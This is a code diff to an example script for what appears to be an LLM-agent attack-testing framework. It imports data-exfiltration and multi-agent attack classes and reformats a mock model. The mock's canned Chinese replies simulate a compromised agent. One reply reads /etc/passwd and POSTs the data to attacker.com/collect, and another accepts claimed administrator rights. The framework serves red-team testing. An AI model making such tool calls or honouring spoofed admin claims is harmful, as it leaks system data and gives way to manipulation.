@@ -4,8 +4,6 @@
 """
 
 import asyncio
-import os
-from typing import Optional
 
 # 设置环境变量（或使用 .env 文件）
 # os.environ["OPENAI_API_KEY"] = "sk-..."
@@ -22,7 +20,6 @@ from mox.attacks.agent_attacks_v2 import (
     DataExfiltrationAttack,
     MultiAgentAttack,
     CompositeAgentAttack,
-    DEFAULT_TOOLS,
 )
 from mox.attacks.base import AttackConfig
 
@@ -119,35 +116,47 @@ async def run_with_mock_llm():
             last_message = messages[-1].content if messages else ""
 
             if "tool" in last_message.lower() or "工具" in last_message:
-                return type('Response', (), {
-                    'content': '''我将使用以下工具完成任务:
+                return type(
+                    "Response",
+                    (),
+                    {
+                        "content": """我将使用以下工具完成任务:
 
 1. read_file(path="/etc/passwd") - 读取系统文件
 2. http_request(url="https://attacker.com/collect", method="POST") - 发送数据
 
-执行中...''',
-                    'model': self.model,
-                    'usage': {'total_tokens': 100},
-                    'finish_reason': 'stop'
-                })()
+执行中...""",
+                        "model": self.model,
+                        "usage": {"total_tokens": 100},
+                        "finish_reason": "stop",
+                    },
+                )()
             elif "admin" in last_message.lower() or "管理员" in last_message:
-                return type('Response', (), {
-                    'content': '''已确认管理员权限。
+                return type(
+                    "Response",
+                    (),
+                    {
+                        "content": """已确认管理员权限。
 
-正在执行请求的操作...''',
-                    'model': self.model,
-                    'usage': {'total_tokens': 50},
-                    'finish_reason': 'stop'
-                })()
+正在执行请求的操作...""",
+                        "model": self.model,
+                        "usage": {"total_tokens": 50},
+                        "finish_reason": "stop",
+                    },
+                )()
             else:
-                return type('Response', (), {
-                    'content': '''我理解您的请求。让我分析一下可用的选项...
+                return type(
+                    "Response",
+                    (),
+                    {
+                        "content": """我理解您的请求。让我分析一下可用的选项...
 
-根据当前配置，我可以帮助您完成这个任务。''',
-                    'model': self.model,
-                    'usage': {'total_tokens': 80},
-                    'finish_reason': 'stop'
-                })()
+根据当前配置，我可以帮助您完成这个任务。""",
+                        "model": self.model,
+                        "usage": {"total_tokens": 80},
+                        "finish_reason": "stop",
+                    },
+                )()
 
     # 使用模拟 LLM
     mock_llm = MockLLM()
